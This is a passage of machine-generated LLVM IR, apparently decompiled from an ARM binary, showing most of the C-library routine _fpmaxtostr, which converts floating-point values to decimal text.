  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_18258, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_18190, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1829c = load i32, i32* @r4, align 4
  store i32 %v3_1829c, i32* %stack_var_-36, align 4
  %v6_1829c = load i32, i32* @r5, align 4
  %v9_1829c = load i32, i32* @r6, align 4
  %v12_1829c = load i32, i32* @r7, align 4
  %v15_1829c = load i32, i32* @r8, align 4
  %v18_1829c = load i32, i32* @sb, align 4
  %v1_182a4 = add i32 %tmp, 8
  %v2_182a4 = inttoptr i32 %v1_182a4 to i8*
  %v3_182a4 = load i8, i8* %v2_182a4, align 1
  %v4_182a4 = zext i8 %v3_182a4 to i32
  store i32 %v4_182a4, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_182ac = or i32 %v4_182a4, 32
  %v2_182b0 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_182b4 = icmp ult i32 %v1_182ac, 97
  store i1 %v6_182b4, i1* %cpsr_n.global-to-local, align 1
  %v7_182b4 = icmp eq i32 %v1_182ac, 97
  store i1 %v7_182b4, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_182c0 = load i32, i32* %arg4, align 4
  store i32 %v2_182c0, i32* %r8.global-to-local, align 4
  br i1 %v7_182b4, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_182c4 = add nuw nsw i32 %v4_182a4, 6
  store i32 %v2_182c4, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_182d8 = phi i32 [ 101, %entry ], [ %v2_182c4, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_182d0 = add i32 %tmp, 12
  %v2_182d0 = inttoptr i32 %v1_182d0 to i32*
  %v3_182d0 = load i32, i32* %v2_182d0, align 4
  store i32 %v3_182d0, i32* %r2.global-to-local, align 4
  %v1_182d4 = add i32 %tmp, 4
  %v2_182d4 = inttoptr i32 %v1_182d4 to i32*
  %v3_182d4 = load i32, i32* %v2_182d4, align 4
  store i32 %v3_182d4, i32* %r1.global-to-local, align 4
  br i1 %v7_182b4, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_182d8 = urem i32 %v1_182d8, 256
  store i32 %v2_182d8, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_182dc = icmp slt i32 %v2_182c0, 0
  store i1 %v1_182dc, i1* %cpsr_n.global-to-local, align 1
  %v2_182dc = icmp eq i32 %v2_182c0, 0
  store i1 %v2_182dc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_182dc, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_182e8 = and i32 %v3_182d0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_182e8 = icmp eq i32 %v1_182e8, 0
  store i1 %v2_182e8, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_182e8, label %dec_label_pc_182fc, label %dec_label_pc_1836c

dec_label_pc_182fc:                               ; preds = %bb184
  %v1_182fc = urem i32 %v3_182d0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_182fc = icmp eq i32 %v1_182fc, 0
  store i1 %v2_182fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182fc, label %.thread10, label %dec_label_pc_1836c

dec_label_pc_1836c:                               ; preds = %dec_label_pc_182fc, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_182fc ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_18370 = add i32 %tmp, 16
  %v3_18370 = inttoptr i32 %v2_18370 to i32*
  store i32 32, i32* %v3_18370, align 4
  %v0_18378 = load i32, i32* %r7.global-to-local, align 4
  %v1_18378 = add i32 %v0_18378, -96
  %v3_18378 = sub i32 95, %v0_18378
  %v4_18378 = and i32 %v3_18378, %v0_18378
  %v5_18378 = icmp slt i32 %v4_18378, 0
  store i1 %v5_18378, i1* %cpsr_v.global-to-local, align 1
  %v6_18378 = icmp slt i32 %v1_18378, 0
  store i1 %v6_18378, i1* %cpsr_n.global-to-local, align 1
  %v7_18378 = icmp eq i32 %v0_18378, 96
  store i1 %v7_18378, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_18378, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_1836c
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_1836c, %bb185
  %v4_18390 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_1836c ]
  %v4_18390..v1_18320 = select i1 %tmp242, i32 %v4_18390, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_2061c.1109 to i32), i32* %r2.global-to-local, align 4
  %v2_1839c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1839c, i32* %r6.global-to-local, align 4
  %v2_183a0 = add i32 %v4_18390..v1_18320, ptrtoint ([4 x i8]* @global_var_2061c.1109 to i32)
  store i32 %v2_183a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18824

.thread10:                                        ; preds = %dec_label_pc_182fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_18428 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_18428, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18430

dec_label_pc_18430:                               ; preds = %dec_label_pc_184a0, %.thread10
  %v3_18444 = phi i32 [ %v2_18490, %dec_label_pc_184a0 ], [ %v3_1829c, %.thread10 ]
  %v1_18444 = phi i1 [ %v5_184a4, %dec_label_pc_184a0 ], [ false, %.thread10 ]
  %v0_18444 = phi i1 [ %v6_184a4, %dec_label_pc_184a0 ], [ false, %.thread10 ]
  %v2_18444 = xor i1 %v1_18444, %v0_18444
  br i1 %v2_18444, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_18430
  %v4_18444 = sub i32 0, %v3_18444
  store i32 %v4_18444, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_18430, %bb186
  %v0_18448 = phi i32 [ %v3_18444, %dec_label_pc_18430 ], [ %v4_18444, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18448 = icmp slt i32 %v0_18448, 0
  store i1 %v1_18448, i1* %cpsr_n.global-to-local, align 1
  %v2_18448 = icmp eq i32 %v0_18448, 0
  store i1 %v2_18448, i1* %cpsr_z.global-to-local, align 1
  %v0_18464 = load i32, i32* %sl.global-to-local, align 4
  %v1_18464 = add i32 %v0_18464, 9
  store i32 %v1_18464, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1846c

dec_label_pc_1846c:                               ; preds = %dec_label_pc_1846c.dec_label_pc_1846c_crit_edge, %bb187
  %v1_18480 = phi i32 [ %v1_18480.pre, %dec_label_pc_1846c.dec_label_pc_1846c_crit_edge ], [ %v1_18464, %bb187 ]
  %v0_18478 = phi i32 [ %v0_18494, %dec_label_pc_1846c.dec_label_pc_1846c_crit_edge ], [ 0, %bb187 ]
  %v0_18484 = phi i32 [ %v2_18490, %dec_label_pc_1846c.dec_label_pc_1846c_crit_edge ], [ %v0_18448, %bb187 ]
  %v2_18474 = urem i32 %v0_18484, 10
  %v1_18478 = add i32 %v0_18478, 1
  store i32 %v1_18478, i32* %r5.global-to-local, align 4
  %v1_1847c = or i32 %v2_18474, 48
  store i32 %v1_1847c, i32* %r2.global-to-local, align 4
  %v2_18480 = sub i32 %v1_18480, %v1_18478
  store i32 %v2_18480, i32* %r3.global-to-local, align 4
  store i32 %v0_18484, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1848c = trunc i32 %v1_1847c to i8
  %v3_1848c = inttoptr i32 %v2_18480 to i8*
  store i8 %v1_1848c, i8* %v3_1848c, align 1
  %v0_18490 = load i32, i32* %r0.global-to-local, align 4
  %v1_18490 = load i32, i32* %r1.global-to-local, align 4
  %v2_18490 = udiv i32 %v0_18490, %v1_18490
  store i32 %v2_18490, i32* %r0.global-to-local, align 4
  %v0_18494 = load i32, i32* %r5.global-to-local, align 4
  %v1_18494 = add i32 %v0_18494, -8
  %v3_18494 = sub i32 7, %v0_18494
  %v4_18494 = and i32 %v3_18494, %v0_18494
  %v5_18494 = icmp slt i32 %v4_18494, 0
  store i1 %v5_18494, i1* %cpsr_v.global-to-local, align 1
  %v6_18494 = icmp slt i32 %v1_18494, 0
  store i1 %v6_18494, i1* %cpsr_n.global-to-local, align 1
  %v7_18494 = icmp eq i32 %v0_18494, 8
  store i1 %v7_18494, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_18490, i32* %r4.global-to-local, align 4
  %v7_1849c = icmp slt i32 %v0_18494, 9
  br i1 %v7_1849c, label %dec_label_pc_1846c.dec_label_pc_1846c_crit_edge, label %dec_label_pc_184a0

dec_label_pc_1846c.dec_label_pc_1846c_crit_edge:  ; preds = %dec_label_pc_1846c
  %v1_18480.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1846c

dec_label_pc_184a0:                               ; preds = %dec_label_pc_1846c
  %v0_184a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_184a0 = add i32 %v0_184a0, 1
  store i32 %v1_184a0, i32* %r6.global-to-local, align 4
  %v3_184a4 = sub i32 -1, %v0_184a0
  %v4_184a4 = and i32 %v1_184a0, %v3_184a4
  %v5_184a4 = icmp slt i32 %v4_184a4, 0
  store i1 %v5_184a4, i1* %cpsr_v.global-to-local, align 1
  %v6_184a4 = icmp slt i32 %v0_184a0, 0
  store i1 %v6_184a4, i1* %cpsr_n.global-to-local, align 1
  %v7_184a4 = icmp eq i32 %v0_184a0, 0
  store i1 %v7_184a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_184a4, label %dec_label_pc_18430, label %dec_label_pc_184ac

dec_label_pc_184ac:                               ; preds = %dec_label_pc_184a0
  %v0_184ac = load i32, i32* %r7.global-to-local, align 4
  %v1_184ac = add i32 %v0_184ac, -96
  %v3_184ac = sub i32 95, %v0_184ac
  %v4_184ac = and i32 %v3_184ac, %v0_184ac
  %v5_184ac = icmp slt i32 %v4_184ac, 0
  store i1 %v5_184ac, i1* %cpsr_v.global-to-local, align 1
  %v6_184ac = icmp slt i32 %v1_184ac, 0
  store i1 %v6_184ac, i1* %cpsr_n.global-to-local, align 1
  %v7_184ac = icmp eq i32 %v0_184ac, 96
  store i1 %v7_184ac, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_184ac, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_184ac
  %v5_184b8 = add i32 %v0_184ac, 32
  store i32 %v5_184b8, i32* %r3.global-to-local, align 4
  %v5_184bc = urem i32 %v5_184b8, 256
  store i32 %v5_184bc, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_184ac, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_184ac ]
  %v0_184dc = phi i32 [ %v5_184bc, %bb188 ], [ %v0_184ac, %dec_label_pc_184ac ]
  %v7_184c0 = icmp eq i32 %v0_184dc, 103
  %.229 = zext i1 %v7_184c0 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_184cc = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_184cc = icmp slt i32 %v0_184cc, 0
  store i1 %v1_184cc, i1* %cpsr_n.global-to-local, align 1
  %v2_184cc = icmp eq i32 %v0_184cc, 0
  store i1 %v2_184cc, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_184cc, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_184d4 = icmp eq i1 %v7_184c0, false
  store i1 %v2_184d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_184d4, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_184d8 = add i32 %v0_184cc, -1
  store i32 %v2_184d8, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_184e8 = phi i32 [ %v0_184cc, %.thread13 ], [ %v0_184cc, %bb192 ], [ %v2_184d8, %bb193 ]
  %v1_184dc = add i32 %v0_184dc, -102
  %v3_184dc = sub i32 101, %v0_184dc
  %v4_184dc = and i32 %v3_184dc, %v0_184dc
  %v5_184dc = icmp slt i32 %v4_184dc, 0
  store i1 %v5_184dc, i1* %cpsr_v.global-to-local, align 1
  %v6_184dc = icmp slt i32 %v1_184dc, 0
  store i1 %v6_184dc, i1* %cpsr_n.global-to-local, align 1
  %v7_184dc = icmp eq i32 %v0_184dc, 102
  store i1 %v7_184dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_184dc, label %dec_label_pc_184e8, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_184e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1850c

dec_label_pc_184e8:                               ; preds = %bb194
  %v1_184e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_184e8 = add i32 %v1_184e8, %v0_184e8
  store i32 %v2_184e8, i32* %ip.global-to-local, align 4
  %v2_184ec = add i32 %v2_184e8, 1
  %v4_184ec = sub i32 0, %v2_184e8
  %v5_184ec = and i32 %v2_184ec, %v4_184ec
  %v6_184ec = icmp slt i32 %v5_184ec, 0
  store i1 %v6_184ec, i1* %cpsr_v.global-to-local, align 1
  %v7_184ec = icmp slt i32 %v2_184ec, 0
  store i1 %v7_184ec, i1* %cpsr_n.global-to-local, align 1
  %v8_184ec = icmp eq i32 %v2_184ec, 0
  store i1 %v8_184ec, i1* %cpsr_z.global-to-local, align 1
  %v6_184f0 = icmp slt i32 %v2_184e8, -1
  br i1 %v6_184f0, label %dec_label_pc_184f4, label %dec_label_pc_1850c

dec_label_pc_184f4:                               ; preds = %dec_label_pc_184e8
  %v2_184f4 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_184f4, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_18500 = bitcast i32* %stack_var_-87 to i8*
  %v3_18500 = call i32 @__GI_memset(i8* %v2_18500, i32 48)
  store i32 %v3_18500, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1850c

dec_label_pc_1850c:                               ; preds = %dec_label_pc_184e8, %bb195, %dec_label_pc_184f4
  %v1_1855069 = phi i32 [ %v2_18490, %bb195 ], [ %v3_18500, %dec_label_pc_184f4 ], [ %v2_18490, %dec_label_pc_184e8 ]
  %v1_18534 = phi i32 [ %v0_184e8, %bb195 ], [ -1, %dec_label_pc_184f4 ], [ %v2_184e8, %dec_label_pc_184e8 ]
  %v1_18510 = add i32 %v1_18534, -16
  %v3_18510 = sub i32 15, %v1_18534
  %v4_18510 = and i32 %v3_18510, %v1_18534
  %v5_18510 = icmp slt i32 %v4_18510, 0
  store i1 %v5_18510, i1* %cpsr_v.global-to-local, align 1
  %v6_18510 = icmp slt i32 %v1_18510, 0
  store i1 %v6_18510, i1* %cpsr_n.global-to-local, align 1
  %v7_18510 = icmp eq i32 %v1_18534, 16
  store i1 %v7_18510, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_1851c = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_1851c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_18524 = icmp sgt i32 %v1_18534, 16
  br i1 %v7_18524, label %.thread18, label %dec_label_pc_18530

.thread18:                                        ; preds = %dec_label_pc_1850c
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_18528 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_18528, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_18530:                               ; preds = %dec_label_pc_1850c
  %v2_18530 = ptrtoint i32* %stack_var_-86 to i32
  %v2_18534 = add i32 %v1_18534, %v2_18530
  store i32 %v2_18534, i32* %r3.global-to-local, align 4
  %v1_18538 = add i32 %v2_18534, 2
  %v2_18538 = inttoptr i32 %v1_18538 to i8*
  %v3_18538 = load i8, i8* %v2_18538, align 1
  %v4_18538 = zext i8 %v3_18538 to i32
  store i32 %v4_18538, i32* %r2.global-to-local, align 4
  store i32 %v1_18538, i32* %r1.global-to-local, align 4
  %v2_18540 = icmp ugt i8 %v3_18538, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_18540 = icmp ult i8 %v3_18538, 52
  store i1 %v6_18540, i1* %cpsr_n.global-to-local, align 1
  %v7_18540 = icmp eq i8 %v3_18538, 52
  store i1 %v7_18540, i1* %cpsr_z.global-to-local, align 1
  %v2_18544 = xor i1 %v2_18540, true
  %v3_18544 = or i1 %v7_18540, %v2_18544
  br i1 %v3_18544, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_18530
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_18530, %bb196
  %v1_1855068 = phi i32 [ %v1_1855069, %dec_label_pc_18530 ], [ 0, %bb196 ]
  %v2_18548 = xor i1 %v7_18540, true
  %v3_18548 = and i1 %v2_18540, %v2_18548
  br i1 %v3_18548, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_18550 = phi i32 [ %v1_18550.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1855068, %bb197 ], [ 1, %bb198 ]
  %v0_1854c = phi i32 [ %v0_18558, %.backedge ], [ %v10_18528, %.thread18 ], [ %v1_18538, %bb197 ], [ %v1_18538, %bb198 ]
  %v1_1854c = add i32 %v0_1854c, -1
  %v2_1854c = inttoptr i32 %v1_1854c to i8*
  %v3_1854c = load i8, i8* %v2_1854c, align 1
  %v4_1854c = zext i8 %v3_1854c to i32
  store i32 %v1_1854c, i32* %r1.global-to-local, align 4
  %v2_18550 = add i32 %v4_1854c, %v1_18550
  store i32 %v2_18550, i32* %r3.global-to-local, align 4
  %v1_18554 = trunc i32 %v2_18550 to i8
  store i8 %v1_18554, i8* %v2_1854c, align 1
  %v0_18558 = load i32, i32* %r1.global-to-local, align 4
  %v1_18558 = inttoptr i32 %v0_18558 to i8*
  %v2_18558 = load i8, i8* %v1_18558, align 1
  %v3_18558 = zext i8 %v2_18558 to i32
  store i32 %v3_18558, i32* %r2.global-to-local, align 4
  %v2_1855c = icmp ugt i8 %v2_18558, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_1855c = icmp ult i8 %v2_18558, 57
  store i1 %v6_1855c, i1* %cpsr_n.global-to-local, align 1
  %v7_1855c = icmp eq i8 %v2_18558, 57
  store i1 %v7_1855c, i1* %cpsr_z.global-to-local, align 1
  %v2_18560 = xor i1 %v2_1855c, true
  %v3_18560 = or i1 %v7_1855c, %v2_18560
  br i1 %v3_18560, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_18564 = xor i1 %v7_1855c, true
  %v3_18564 = and i1 %v2_1855c, %v2_18564
  br i1 %v3_18564, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_1856c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_1856c = phi i32 [ %v1_1856c.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_18568 = icmp ult i8 %v2_18558, 48
  store i1 %v6_18568, i1* %cpsr_n.global-to-local, align 1
  %v7_18568 = icmp eq i8 %v2_18558, 48
  store i1 %v7_18568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18568, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_1856c = or i32 %v1_1856c, 1
  store i32 %v2_1856c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1857021 = icmp slt i32 %v2_1856c, 0
  store i1 %v1_1857021, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18570 = icmp slt i32 %v1_1856c, 0
  store i1 %v1_18570, i1* %cpsr_n.global-to-local, align 1
  %v2_18570 = icmp eq i32 %v1_1856c, 0
  store i1 %v2_18570, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18570, label %dec_label_pc_18578, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_18550.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_18578:                               ; preds = %bb203
  store i32 %v2_1851c, i32* %r2.global-to-local, align 4
  %v2_1857c = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_1857c, i32* %r3.global-to-local, align 4
  %v2_18580 = sub i32 %v0_18558, %v2_1857c
  %v3_18580 = icmp uge i32 %v0_18558, %v2_1857c
  %v4_18580 = xor i32 %v0_18558, %v2_1857c
  %v5_18580 = xor i32 %v2_18580, %v0_18558
  %v6_18580 = and i32 %v5_18580, %v4_18580
  %v7_18580 = icmp slt i32 %v6_18580, 0
  store i1 %v7_18580, i1* %cpsr_v.global-to-local, align 1
  %v8_18580 = icmp slt i32 %v2_18580, 0
  store i1 %v8_18580, i1* %cpsr_n.global-to-local, align 1
  %v9_18580 = icmp eq i32 %v0_18558, %v2_1857c
  store i1 %v9_18580, i1* %cpsr_z.global-to-local, align 1
  %v2_18584 = xor i1 %v3_18580, true
  %v3_18584 = or i1 %v9_18580, %v2_18584
  br i1 %v3_18584, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_18578
  store i32 %v2_1857c, i32* %r2.global-to-local, align 4
  store i32 %v2_1857c, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_18578, %bb204
  %v2_185a0 = phi i32 [ %v2_1857c, %bb204 ], [ %v0_18558, %dec_label_pc_18578 ]
  %v4_18590123 = phi i32 [ %v2_1857c, %bb204 ], [ %v2_1851c, %dec_label_pc_18578 ]
  %v2_1858c = xor i1 %v9_18580, true
  %v3_1858c = and i1 %v3_18580, %v2_1858c
  br i1 %v3_1858c, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_1858c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_1858c, i32* %r0.global-to-local, align 4
  %v5_18590 = add i32 %v4_18590123, 2
  store i32 %v5_18590, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_18584, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_18594 = load i32, i32* %sb.global-to-local, align 4
  %v5_18594 = add i32 %v4_18594, 1
  store i32 %v5_18594, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1859c = load i32, i32* %r7.global-to-local, align 4
  %v1_1859c = add i32 %v0_1859c, -103
  %v3_1859c = sub i32 102, %v0_1859c
  %v4_1859c = and i32 %v3_1859c, %v0_1859c
  %v5_1859c = icmp slt i32 %v4_1859c, 0
  store i1 %v5_1859c, i1* %cpsr_v.global-to-local, align 1
  %v6_1859c = icmp slt i32 %v1_1859c, 0
  store i1 %v6_1859c, i1* %cpsr_n.global-to-local, align 1
  %v7_1859c = icmp eq i32 %v0_1859c, 103
  store i1 %v7_1859c, i1* %cpsr_z.global-to-local, align 1
  %v3_185a0 = add i32 %v2_185a0, 1
  %v4_185a0 = inttoptr i32 %v3_185a0 to i8*
  store i8 0, i8* %v4_185a0, align 1
  %v0_185a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_185a4 = add i32 %v0_185a4, 1
  store i32 %v1_185a4, i32* %r1.global-to-local, align 4
  %v0_185a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_185a8, label %bb208, label %dec_label_pc_185d8

bb208:                                            ; preds = %bb207
  %v0_185ac = load i32, i32* %r0.global-to-local, align 4
  %v1_185ac = load i32, i32* %ip.global-to-local, align 4
  %not.v7_185b0 = icmp sge i32 %v1_185ac, %v0_185ac
  %. = zext i1 %not.v7_185b0 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_185b8 = add i32 %v0_185ac, 4
  %v4_185b8 = sub i32 0, %v0_185ac
  %v5_185b8 = and i32 %v2_185b8, %v4_185b8
  %v6_185b8 = icmp slt i32 %v5_185b8, 0
  store i1 %v6_185b8, i1* %cpsr_v.global-to-local, align 1
  %v7_185b8 = icmp slt i32 %v2_185b8, 0
  store i1 %v7_185b8, i1* %cpsr_n.global-to-local, align 1
  %v8_185b8 = icmp eq i32 %v2_185b8, 0
  store i1 %v8_185b8, i1* %cpsr_z.global-to-local, align 1
  %v5_185bc = icmp slt i32 %v0_185ac, -4
  br i1 %v5_185bc, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_185c0 = icmp eq i1 %not.v7_185b0, false
  store i1 %v2_185c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_185c0, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_185c429 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_185c429, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_185e4

bb210:                                            ; preds = %bb209
  %v3_185c8 = sub i32 %v1_185ac, %v0_185ac
  store i32 %v3_185c8, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_185f0

dec_label_pc_185d8:                               ; preds = %bb207
  %v0_185d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_185d8 = add i32 %v0_185d8, -102
  %v3_185d8 = sub i32 101, %v0_185d8
